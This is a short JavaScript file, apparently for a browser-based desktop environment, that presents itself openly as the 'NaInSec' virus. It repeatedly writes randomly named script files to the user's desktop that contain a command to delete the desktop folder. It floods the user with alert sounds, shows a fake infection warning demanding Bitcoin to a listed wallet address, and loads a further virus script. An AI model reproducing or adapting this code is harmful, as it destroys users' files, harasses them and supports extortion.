(function theLoop(i) {
    setTimeout(function() {

        // Function to generate random number
        function randomNumber(min, max) {
            min = Math.ceil(min);
            max = Math.floor(max);
            return Math.floor(Math.random() * (max - min + 0.01)) + min;
        }

        $store.set('desktop/nainsec' + (randomNumber(1, 1000000)) + '.js', '$store.del("/a/desktop/")');
        for (let j = 0; j < 14; j++) {
            $audio('alert').play();
        }
        $store.keys();
        if (--i) {
            theLoop(i);
        }
    }, 10);
})(50);

$alert('WARNING YOU HAVE BEEN INFECTED BY NAINSEC. Please Donate BTC: 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5');
$loader.script("NaInSec_Virus.js");
